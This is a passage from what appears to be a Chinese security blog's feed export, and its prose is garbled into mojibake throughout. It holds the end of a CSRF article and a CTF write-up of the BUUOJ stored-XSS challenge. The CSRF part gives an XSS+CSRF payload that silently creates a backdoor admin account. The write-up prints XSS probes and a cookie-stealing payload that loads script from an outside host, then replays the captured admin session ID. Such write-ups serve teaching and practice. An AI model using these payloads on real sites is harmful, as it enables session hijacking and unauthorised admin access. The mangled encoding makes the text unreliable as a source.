class="token operator">%</span><span class="token constant">E5</span><span class="token operator">%</span>8A<span class="token operator">%</span><span class="token constant">A0</span><span class="token operator">%</span><span class="token constant">E7</span><span class="token operator">%</span><span class="token number">94</span><span class="token operator">%</span><span class="token constant">A8</span><span class="token operator">%</span><span class="token constant">E6</span><span class="token operator">%</span><span class="token number">88</span><span class="token operator">%</span><span class="token constant">B7</span><span class="token operator">&amp;</span>userid<span class="token operator">=</span><span class="token number">0</span>\'<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬å°†è¿™æ®µä»£ç æ’å…¥åˆ°ç½‘ç«™ç•™è¨€æ¿ä¸­ï¼Œç„¶åæ¨¡æ‹Ÿç½‘ç«™ç®¡ç†å‘˜ï¼Œç™»å…¥åå°ï¼Œè¿›è¡Œç•™è¨€å®¡æ ¸ï¼Œåªè¦ç®¡ç†å‘˜åˆ·æ–°é¡µé¢å°±ä¼šè§¦å‘XSS ä»£ç ï¼Œä»¥ç®¡ç†å‘˜çš„èº«ä»½å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œåˆ›å»ºä¸€ä¸ªåå°è´¦æˆ·[GGG/123456],åŒæ—¶ç½‘ç«™åå°ç®¡ç†å‘˜ä¸€ç‚¹æ„Ÿè§‰éƒ½æ²¡æœ‰ã€‚</p><blockquote><h4 id="EXï¼šXSS-CSRFæ·»åŠ åå°ç®¡ç†è´¦å·"><a href="#EXï¼šXSS-CSRFæ·»åŠ åå°ç®¡ç†è´¦å·" class="headerlink" title="EXï¼šXSS+CSRFæ·»åŠ åå°ç®¡ç†è´¦å·"></a>EXï¼šXSS+CSRFæ·»åŠ åå°ç®¡ç†è´¦å·</h4><p>æ”»å‡»è€…å‘é€æ¶æ„ç•™è¨€ï¼š</p><img src="/2025/02/11/web-an-quan/kua-zhan-qing-qiu-wei-zao-lou-dong-csrf/%E6%88%AA%E5%B1%8F2021-07-20%20%E4%B8%8A%E5%8D%888.49.13.png" style="zoom:55%;"><img src="/2025/02/11/web-an-quan/kua-zhan-qing-qiu-wei-zao-lou-dong-csrf/%E6%88%AA%E5%B1%8F2021-07-20%20%E4%B8%8A%E5%8D%888.49.49.png" style="zoom:55%;"><p>ç®¡ç†å‘˜å®¡æ ¸ç•™è¨€ï¼š</p><img src="/2025/02/11/web-an-quan/kua-zhan-qing-qiu-wei-zao-lou-dong-csrf/%E6%88%AA%E5%B1%8F2021-07-20%20%E4%B8%8A%E5%8D%888.51.27.png" style="zoom:75%;"><p>è¢«æ”»å‡»ï¼šæŒ‰ç…§é»‘å®¢çš„æ„æ„¿æ·»åŠ äº†åå°ç®¡ç†è´¦å·</p><img src="/2025/02/11/web-an-quan/kua-zhan-qing-qiu-wei-zao-lou-dong-csrf/%E6%88%AA%E5%B1%8F2021-07-20%20%E4%B8%8A%E5%8D%888.51.44.png" style="zoom:80%;"><p>æ”»å‡»è€…ç™»é™†åå°ï¼šâœ…</p><img src="/2025/02/11/web-an-quan/kua-zhan-qing-qiu-wei-zao-lou-dong-csrf/%E6%88%AA%E5%B1%8F2021-07-20%20%E4%B8%8A%E5%8D%888.53.17.png" style="zoom:80%;"></blockquote><h1 id="å…­ã€CSRFçš„é˜²å¾¡"><a href="#å…­ã€CSRFçš„é˜²å¾¡" class="headerlink" title="å…­ã€CSRFçš„é˜²å¾¡"></a>å…­ã€CSRFçš„é˜²å¾¡</h1><h2 id="6-1-æ— æ•ˆé˜²å¾¡"><a href="#6-1-æ— æ•ˆé˜²å¾¡" class="headerlink" title="6.1 æ— æ•ˆé˜²å¾¡"></a>6.1 æ— æ•ˆé˜²å¾¡</h2><p>å¾ˆå¤šé˜²å¾¡æ–¹å¼éƒ½æ²¡æœ‰è§£å†³CSRFçš„é—®é¢˜ã€‚</p><ul><li><p>ä½¿ç”¨ç§˜å¯†cookie</p><p>ä½†æ˜¯ï¼Œæ‰€æœ‰cookieï¼Œå³ä½¿æ˜¯ç§˜å¯†çš„cookieï¼Œä¹Ÿä¼šéšç€æ¯ä¸ªè¯·æ±‚ä¸€èµ·æäº¤ã€‚æ— è®ºæœ€ç»ˆç”¨æˆ·æ˜¯å¦è¢«æ¬ºéª—æäº¤è¯·æ±‚ï¼Œéƒ½å°†æäº¤æ‰€ç”¨èº«ä»½éªŒè¯ä»¤ç‰Œï¼ˆèº«ä»½å‡­æ®ï¼‰ã€‚</p></li><li><p>ä»…æ¥å—POSTè¯·æ±‚</p></li></ul><p> å¯ä»¥å¼€å‘åº”ç”¨ç¨‹åºä»¥ä»…æ¥å—ç”¨äºæ‰§è¡Œä¸šåŠ¡é€»è¾‘çš„POSTè¯·æ±‚ã€‚è¯¯è§£æ˜¯ç”±äºæ”»å‡»è€…æ— æ³•æ„å»ºæ¶æ„é“¾æ¥ï¼Œå› æ­¤æ— æ³•æ‰§è¡ŒCSRFæ”»å‡»ã€‚ä¸å¹¸çš„æ˜¯ï¼Œè¿™ç§é€»è¾‘æ˜¯ä¸æ­£ç¡®çš„ã€‚æœ‰è®¸å¤šæ–¹æ³•å¯ä»¥è®©æ”»å‡»è€…æ¬ºéª—å—å®³è€…æäº¤ä¼ªé€ çš„POSTè¯·æ±‚ï¼Œä¾‹å¦‚åœ¨éšè—å€¼çš„æ”»å‡»è€…ç½‘ç«™ä¸­æ‰˜ç®¡çš„ç®€å•è¡¨å•ã€‚æ­¤è¡¨å•å¯ä»¥æœ‰Javascriptè‡ªåŠ¨è§¦å‘ï¼Œä¹Ÿå¯ä»¥ç”±è®¤ä¸ºè¡¨å•ä¼šæ‰§è¡Œå…¶ä»–æ“ä½œçš„å—å®³è€…è§¦å‘ã€‚</p><ul><li>å¤šæ­¥äº¤æ˜“</li></ul><p>å¤šæ­¥äº¤æ˜“ä¸è¶³ä»¥é¢„é˜²CSRFï¼Œåªè¦æ”»å‡»è€…å¯ä»¥é¢„æµ‹æˆ–æ¨æ–­å®Œæ•´çš„äº‹åŠ¡çš„æ¯ä¸ªæ­¥éª¤ï¼Œå°±å¯ä»¥å®ç°CSRFã€‚</p><ul><li>URLé‡å†™</li></ul><p>è¿™å¯èƒ½è¢«è§†ä¸ºæœ‰ç”¨çš„CSRFé¢„é˜²æŠ€æœ¯ï¼Œå› ä¸ºæ”»å‡»è€…æ— æ³•çŒœæµ‹å—å®³è€…çš„ä¼šè¯IDã€‚ä½†æ˜¯ï¼Œç”¨æˆ·çš„ä¼šè¯IDåœ¨URLä¸­å…¬å¼€ã€‚æ‰€ä»¥ä¸å»ºè®®å¼•å…¥å¦ä¸€ä¸ªæ¼æ´æ¥ä¿®å¤ä¸€ä¸ªæ¼æ´ã€‚</p><ul><li>HTTPS</li></ul><p>HTTPS æœ¬èº«æ— æ³•é˜²å¾¡CSRFã€‚ä½†æ˜¯ï¼ŒHTTPSåº”è¢«è§†ä¸ºä»»ä½•é¢„é˜²æªæ–½åº”è¢«å€¼å¾—ä¿¡èµ–çš„å…ˆå†³æ¡ä»¶ã€‚</p><h2 id="6-2-æœ‰æ•ˆé˜²å¾¡"><a href="#6-2-æœ‰æ•ˆé˜²å¾¡" class="headerlink" title="6.2 æœ‰æ•ˆé˜²å¾¡"></a>6.2 æœ‰æ•ˆé˜²å¾¡</h2><ul><li><strong>éªŒè¯Refererå­—æ®µï¼ˆå…¶å®æ— æ•ˆï¼‰</strong></li></ul><p>æ ¹æ®HTTPåè®®ï¼Œåœ¨HTTPå¤´ä¸­æœ‰ä¸€ä¸ªå­—æ®µReferer,ä»–è®°å½•äº†è¯¥HTTPè¯·æ±‚çš„æ¥æºåœ°å€ã€‚åœ¨é€šå¸¸æƒ…å†µä¸‹ï¼Œè®¿é—®ä¸€ä¸ªå®‰å…¨å—é™é¡µé¢çš„è¯·æ±‚å¿…é¡»æ¥è‡ªäºåŒä¸€ä¸ªç½‘ç«™ã€‚ç”¨æˆ·æ­£å¸¸ç™»å½•è¯¥é“¶è¡Œç½‘ç«™ï¼Œåœ¨é¦–æ¬¡æäº¤æ—¶ï¼Œè¯¥è½¬è´¦è¯·æ±‚çš„Referer çš„å€¼å°±æ˜¯å½“å‰é¡µé¢çš„URLã€‚è€Œå¦‚æœæ”»å‡»è€…è¦è¯¥ç½‘ç«™å®æ–½CSRF æ”»å‡»ï¼Œä»–åªèƒ½åœ¨è‡ªå·±çš„ç½‘ç«™æ„é€ è¯·æ±‚ï¼Œå½“ç”¨æˆ·é€šè¿‡æ”»å‡»è€…çš„ç½‘ç«™å‘é€è¯·æ±‚åˆ°é“¶è¡Œä½¿ï¼Œé“¶è¡Œå°±ä¼šéªŒè¯å…¶Referer å€¼ï¼Œå¦‚æœReferer ä½¿å…¶ä»–ç½‘ç«™çš„è¯ï¼Œå°±æœ‰å¯èƒ½æ˜¯CSRF æ”»å‡»ï¼Œåˆ™æ‹’ç»è¯¥è¯·æ±‚ã€‚</p><p>ï¼ˆæ³¨ï¼šReferer ä½¿å¯ä»¥ä¿®æ”¹çš„ï¼‰</p><ul><li><strong>æ·»åŠ TokenéªŒè¯</strong></li></ul><p>CSRF æ”»å‡»ä¹‹æ‰€ä»¥èƒ½å¤ŸæˆåŠŸï¼Œæ˜¯å› ä¸ºæ”»å‡»è€…å¯ä»¥ä¼ªé€ ç”¨çš„è¯·æ±‚ï¼Œè¯¥è¯·æ±‚ä¸­æ‰€ç”¨çš„ç”¨æˆ·éªŒè¯ä¿¡æ¯éƒ½å­˜åœ¨ä¸cookie ä¸­ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥åœ¨ä¸çŸ¥é“è¿™äº›éªŒè¯ä¿¡æ¯çš„æƒ…æ³ä¸‹ç›´æ¥åˆ©ç”¨ç”¨æˆ·è‡ªå·±çš„Cookie æ¥å®‰å…¨éªŒè¯ã€‚ç”±æ­¤å¯çŸ¥ï¼Œä½äºCSRF æ”»å‡»çš„å…³é”®åœ¨äºï¼šåœ¨è¯·æ±‚ä¸­æ”¾å…¥æ”»å‡»è€…ä¸èƒ½ä¼ªé€ çš„ä¿¡æ¯ï¼Œå¹¶ä¸”è¯¥ä¿¡æ¯ä¸å­˜åœ¨äºCookie ä¹‹ä¸­ã€‚é‰´äºæ­¤ï¼Œç³»ç»Ÿå¼€å‘è€…å¯ä»¥åœ¨HTTPè¯·æ±‚ä¸­ä»¥å‚æ•°çš„å½¢å¼åŠ å…¥ä¸€ä¸ªéšæœºäº§ç”Ÿçš„token å€¼ï¼ˆéšæœºå­—ç¬¦ä¸²ï¼‰ï¼Œå¹¶åœ¨æœåŠ¡å™¨ç«¯å»ºç«‹ä¸€ä¸ªæ‹¦æˆªå™¨ç”¨æ¥éªŒè¯è¿™ä¸ªtokenï¼Œå¦‚æœè¯·æ±‚ä¸­æ²¡æœ‰token æˆ–è€…tokenå†…å®¹ä¸æ­£ç¡®ï¼Œåˆ™è®¤ä¸ºå¯èƒ½æ˜¯CSRFæ”»å‡»è€Œæ‹’ç»è¯¥è¯·æ±‚ã€‚</p><ul><li><strong>äºŒæ¬¡éªŒè¯</strong></li></ul><p>äºŒæ¬¡éªŒè¯ï¼Œå°±æ˜¯åœ¨è½¬è´¦ç­‰å…³é”®æ“ä½œä¹‹å‰æä¾›å½“å‰ç”¨æˆ·çš„å¯†ç æˆ–è€…éªŒè¯ç ã€‚äºŒæ¬¡éªŒè¯å¯ä»¥æœ‰æ•ˆåœ°é˜²å¾¡CSRFæ”»å‡»ã€‚</p><ul><li><strong>ç”¨æˆ·å…»æˆè‰¯å¥½çš„ä¹ æƒ¯</strong></li></ul><p>å¦‚è‹¥æˆ‘ä»¬å…»æˆè‰¯å¥½çš„ä¸Šç½‘ä¹ æƒ¯ï¼Œåˆ™èƒ½å¾ˆå¤§ç¨‹åº¦ä¸Šå‡å°‘CSRFæ”»å‡»çš„å±å®³ï¼Œä¾‹å¦‚ï¼Œç”¨æˆ·åœ¨ä¸Šç½‘æ—¶ï¼Œä¸è¦è½»æ˜“ç‚¹å‡»ç½‘ç»œè®ºå›ã€èŠå¤©å®¤ã€å³æ—¶é€šè®¯å·¥å…·æˆ–ç”µå­é‚®ä»¶ä¸­å‡ºç°çš„é“¾æ¥æˆ–è€…å›¾ç‰‡ï¼›å³æ—¶é€€å‡ºé•¿æ—¶é—´ä¸é€‚ç”¨çš„å·²ç™»å½•è´¦æˆ·ï¼Œå°¤å…¶æ˜¯ç®¡ç†å‘˜ï¼Œåº”å°½é‡åœ¨ç™»å‡ºç³»ç»Ÿçš„æƒ…å†µä¸‹ç‚¹å‡»æœªçŸ¥é“¾æ¥æˆ–å›¾ç‰‡ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œç”¨æˆ·è¿˜éœ€è¦å†è¿æ¥äº’è”ç½‘çš„è®¡ç®—æœºä¸Šå®‰è£…åˆé€‚çš„å®‰å…¨é˜²æŠ¤è½¯ä»¶ï¼Œå¹¶åŠæ—¶æ›´æ–°è½¯ä»¶å‚å•†å‘å¸ƒçš„ç‰¹å¾åº“ï¼Œä»¥ä¿æŒå®‰å…¨è½¯ä»¶å¯¹æœ€æ–°æ”»å‡»çš„å®æ—¶è·Ÿè¸ªã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰æ¼æ´æ˜¯ä¸€ç§ç½‘ç»œå®‰å…¨å¸¸è§çš„æ¼æ´ã€‚æ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´ï¼Œè¯±å¯¼ç”¨æˆ·åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡ç”¨æˆ·å·²ç™»å½•çš„åˆæ³•èº«ä»½ï¼Œå‘ç›®æ ‡ç½‘ç«™å‘é€æ¶æ„è¯·æ±‚ã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯èƒ½é€šè¿‡åœ¨å…¶ä»–ç½‘ç«™åµŒå…¥æ¶æ„é“¾æ¥æˆ–è¡¨å•ï¼Œå½“ç”¨æˆ·ç‚¹å‡»æˆ–æäº¤æ—¶ï¼Œè¿™äº›è¯·æ±‚ä¼šä»¥ç”¨æˆ·çš„åä¹‰åœ¨ç›®æ ‡ç½‘ç«™ä¸Šæ‰§è¡ŒæŸäº›æ“ä½œï¼ˆå¦‚ä¿®æ”¹å¯†ç ã€è½¬è´¦ç­‰ï¼‰ã€‚è¿™ç§æ¼æ´çš„æ ¹æºåœ¨äºç›®æ ‡ç½‘ç«™æœªèƒ½å……åˆ†éªŒè¯è¯·æ±‚æ˜¯å¦ç”±ç”¨æˆ·ä¸»åŠ¨å‘èµ·ï¼Œä»è€Œå¯¼è‡´ç”¨æˆ·çš„è´¦æˆ·è¢«æ¶æ„æ“ä½œï¼Œç»™ç”¨æˆ·å’Œç½‘ç«™å¸¦æ¥ä¸¥é‡çš„å®‰å…¨éšæ‚£ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
            <tag> æ¼æ´çŸ¥è¯†åº“ </tag>
            
            <tag> CSRF </tag>
            
            <tag> è·¨ç«™è¯·æ±‚ä¼ªé€  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web-buuoj-(BUU XSS COURSE1)</title>
      <link href="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/"/>
      <url>/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€é¢˜é¢"><a href="#ä¸€ã€é¢˜é¢" class="headerlink" title="ä¸€ã€é¢˜é¢"></a>ä¸€ã€é¢˜é¢</h2><p>åœ°å€ï¼š<a href="https://buuoj.cn/challenges#BUU%20XSS%20COURSE%201">https://buuoj.cn/challenges#BUU%20XSS%20COURSE%201</a></p><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208114946218.png" style="zoom:50%;"><p>é¢˜é¢:</p><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208115050858.png" style="zoom:80%;"><p>ä¸»è¦æœ‰ä¸¤ä¸ªåŠŸèƒ½ï¼Œâ€œåæ§½â€å’Œâ€œç™»å½•â€ã€‚</p><h1 id="äºŒã€æ ¸å¿ƒæ€è·¯"><a href="#äºŒã€æ ¸å¿ƒæ€è·¯" class="headerlink" title="äºŒã€æ ¸å¿ƒæ€è·¯"></a>äºŒã€æ ¸å¿ƒæ€è·¯</h1><p>æœ¬å…³æ—¢ç„¶è€ƒå¯Ÿxssï¼Œé‚£ä¹ˆæ ¸å¿ƒæ€è·¯å°±æ˜¯ï¼š</p><p>1ï¼‰é€šè¿‡åœ¨ç•™è¨€å¤„æ³¨å…¥xssæ”»å‡»ä»£ç ï¼›</p><p>2ï¼‰ç„¶åç­‰å¾…ç®¡ç†å‘˜è®¿é—®ç•™è¨€ï¼Œè§¦å‘xssæ”»å‡»ä»£ç çš„æ‰§è¡Œï¼›</p><p>3ï¼‰ç›—å–ç®¡ç†å‘˜çš„ç™»å½•å‡­æ®ï¼Œè¿›è€Œç™»å½•åå°ã€‚</p><h1 id="ä¸‰ã€è§£é¢˜"><a href="#ä¸‰ã€è§£é¢˜" class="headerlink" title="ä¸‰ã€è§£é¢˜"></a>ä¸‰ã€è§£é¢˜</h1><h2 id="3-1-æ¼æ´æ¢æµ‹"><a href="#3-1-æ¼æ´æ¢æµ‹" class="headerlink" title="3.1 æ¼æ´æ¢æµ‹"></a>3.1 æ¼æ´æ¢æµ‹</h2><ul><li>æäº¤12345æ•°æ®ã€‚</li></ul><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208115539452.png" style="zoom:80%;"><ul><li>è®¿é—®ç•™è¨€å†…å®¹</li></ul><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208115737530.png" style="zoom:80%;"><p>æµ‹è¯•å‡ æ¬¡å‘ç°æ¯æ¬¡ä¿å­˜çš„é“¾æ¥éƒ½ä¼šä¸ä¸€æ ·ã€‚</p><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208120601608.png" style="zoom:50%;"><p>ç•™è¨€å†…å®¹ä¼šæ’å…¥åœ¨ä¸€ä¸ªspanæ ‡ç­¾ä¸­ã€‚</p><ul><li>æµ‹è¯•XSS POC</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script " ' Oonn<span class="token operator">&gt;</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208115955748.png" style="zoom:80%;"><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208120047378.png" style="zoom:80%;"><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208120319154.png" style="zoom:80%;"><p>è‡ªåŠ¨æ·»åŠ äº†scripté—­åˆæ ‡ç­¾ã€‚</p><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208124618612.png" style="zoom:80%;"><p>scriptè„šæœ¬æ’å…¥æˆåŠŸäº†ä½†æ˜¯æ²¡æœ‰è¢«æ‰§è¡Œï¼Œæ²¡æœ‰å‡ºç°å¼¹çª—ã€‚</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span>x onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208125159738.png" style="zoom:77%;"><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208125227297.png" style="zoom:80%;"><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208125401014.png" style="zoom:67%;"><p>æˆåŠŸè§¦å‘xssä»£ç çš„æ‰§è¡Œã€‚</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span>x onmouseover<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208125439337.png" style="zoom:80%;"><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208125652562.png" style="zoom:80%;"><p>ä½¿ç”¨imgæ ‡ç­¾æˆåŠŸè§¦å‘xssä»£ç çš„æ‰§è¡Œã€‚</p><p>è¯´æ˜ç›®æ ‡å­˜åœ¨å­˜å‚¨å‹çš„XSSæ¼æ´ã€‚</p><h2 id="3-2-æ¼æ´åˆ©ç”¨"><a href="#3-2-æ¼æ´åˆ©ç”¨" class="headerlink" title="3.2 æ¼æ´åˆ©ç”¨"></a>3.2 æ¼æ´åˆ©ç”¨</h2><h3 id="3-2-1-xsså¹³å°"><a href="#3-2-1-xsså¹³å°" class="headerlink" title="3.2.1 xsså¹³å°"></a>3.2.1 xsså¹³å°</h3><ul><li><p><a href="https://xss.pt/xss.php">https://xss.pt/xss.php</a> ã€å…è´¹ä¼šå‘˜ï¼ˆæš‚åœæœåŠ¡ï¼‰ï¼VIPèµåŠ©ä¼šå‘˜ï¼ˆæ­£å¸¸ä½¿ç”¨ï¼‰ã€‚ã€‘</p></li><li><p><a href="https://xssaq.com/">https://xssaq.com/</a> ã€ç»è¿‡æµ‹è¯•ï¼Œä¸æ˜¯å¾ˆå¥½ç”¨ã€‚ã€‘</p></li><li><p><a href="https://xssjs.com/">https://xssjs.com/</a> ã€æ¨èã€‘</p></li></ul><h3 id="3-2-2-åˆ©ç”¨è¿‡ç¨‹"><a href="#3-2-2-åˆ©ç”¨è¿‡ç¨‹" class="headerlink" title="3.2.2 åˆ©ç”¨è¿‡ç¨‹"></a>3.2.2 åˆ©ç”¨è¿‡ç¨‹</h3><ul><li>åˆ›å»ºé¡¹ç›®</li></ul><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208140014466.png" style="zoom:80%;"><ul><li>é…ç½®é¡¹ç›®</li></ul><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208140113728.png" style="zoom:80%;"><p>ä¸€èˆ¬æƒ…å†µä¸‹é€‰æ‹©è¶…å¼ºé»˜è®¤æ¨¡å—å³å¯ã€‚</p><ul><li>æŸ¥çœ‹payload</li></ul><p>ç‚¹å‡»<code>æŸ¥çœ‹ä»£ç </code>ï¼ŒæŸ¥çœ‹payloadã€‚</p><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208140214727.png" style="zoom:80%;"><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208140332992.png" style="zoom:80%;"><p>æ ¹æ®æƒ…å†µé€‰æ‹©é€‚åˆçš„payloadæ’å…¥åˆ°å­˜åœ¨xssæ¼æ´çš„ä½ç½®å³å¯ã€‚é’ˆå¯¹æœ¬é¢˜ç›®ï¼Œé€‰æ‹©äº†ä¸Šé¢é«˜äº®çš„payloadï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span>x onerror<span class="token operator">=</span>s<span class="token operator">=</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">'//uj.ci/bok'</span><span class="token punctuation">;</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>æ’å…¥payload</li></ul><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208140508718.png" style="zoom:80%;"><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208140606132.png" style="zoom:67%;"><p>å¯ä»¥çœ‹åˆ°ä»£ç è¢«æˆåŠŸæ’å…¥ã€‚</p><ul><li>ç›—å–cookie</li></ul><p>å½“åå°ç®¡ç†å‘˜è®¿é—®æˆ‘ä»¬çš„ç•™è¨€æ—¶ï¼Œè§¦å‘xssä»£ç çš„æ‰§è¡Œï¼Œä¸Šçº¿xsså¹³å°ã€‚</p><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208141019568.png" style="zoom:80%;"><p>å¯ä»¥çœ‹åˆ°ç®¡ç†å‘˜çš„æ•æ„Ÿä¿¡æ¯å·²ç»è¢«æˆ‘ä»¬è·å–åˆ°äº†ï¼ŒåŒ…æ‹¬ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cookie <span class="token builtin class-name">:</span> <span class="token assign-left variable">PHPSESSID</span><span class="token operator">=</span>1b0db00bb2d687b7bf520ae8e22e05e4 ã€ç®¡ç†å‘˜çš„cookieã€‘HTTP_REFERER <span class="token builtin class-name">:</span> http://web/backend/admin.php ã€åå°é¡µé¢ã€‘<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>å†’å……ç®¡ç†å‘˜ç™»å½•</li></ul><p>å½“ä½¿ç”¨å½“å‰çš„PHPSESSIDå°è¯•è®¿é—®ç®¡ç†å‘˜é¡µé¢æ—¶ï¼š</p><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208141610037.png" style="zoom:50%;"><p>æç¤ºæ²¡æœ‰ç™»å½•ã€‚</p><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208141233180.png" style="zoom:80%;"><p>è¿™æ˜¯æˆ‘ä»¬ç›®å‰çš„PHPSESSIDå€¼ã€‚</p><p>å°†PHPSESSIDçš„å€¼ä¿®æ”¹ä¸º<code>1b0db00bb2d687b7bf520ae8e22e05e4</code>ï¼Œä¹Ÿå°±æ˜¯ç®¡ç†å‘˜çš„cookieã€‚</p><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208141325803.png" style="zoom:80%;"><p>ç„¶åè®¿é—®åå°é¡µé¢ï¼š<code>/backend/admin.php</code></p><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208141419694.png" style="zoom:80%;"><p>å‘ç°èƒ½å¤ŸæˆåŠŸè®¿é—®å›å°å¹¶è·å–flagã€‚</p><h2 id="3-3-Flag"><a href="#3-3-Flag" class="headerlink" title="3.3 Flag"></a>3.3 Flag</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag<span class="token punctuation">{</span>bdc5ff12-2c30-4bba-8777-8a617f70c93a<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æœ¬æ–‡ä¸»è¦åŸºäºbuuojå¹³å°çš„(BUU XSS COURSE1)é¢˜ç›®æ¥å®è·µå­˜å‚¨å‹XSSæ¼æ´çš„æŒ–æ˜ä¸åˆ©ç”¨è¿‡ç¨‹ã€‚æ•´ä¸ªè¿‡ç¨‹åŒ…æ‹¬å‡ ä¸ªæ ¸å¿ƒç‚¹ï¼š1ï¼‰æ¼æ´æ¢æµ‹ã€2ï¼‰é€šè¿‡xsså¹³å°æ„å»ºpayload ã€3ï¼‰ç›—å–ç®¡ç†å‘˜çš„å‡­æ®ã€4ï¼‰å†’å……ç®¡ç†ç™»å½•åå°ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTFå®æˆ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
            <tag> è·¨ç«™è„šæœ¬æ”»å‡» </tag>
            
            <tag> CTFå®æˆ˜ </tag>
            
            <tag> å­˜å‚¨å‹XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶è§£ææ¼æ´</title>
      <link href="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/"/>
      <url>/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/</url>
      
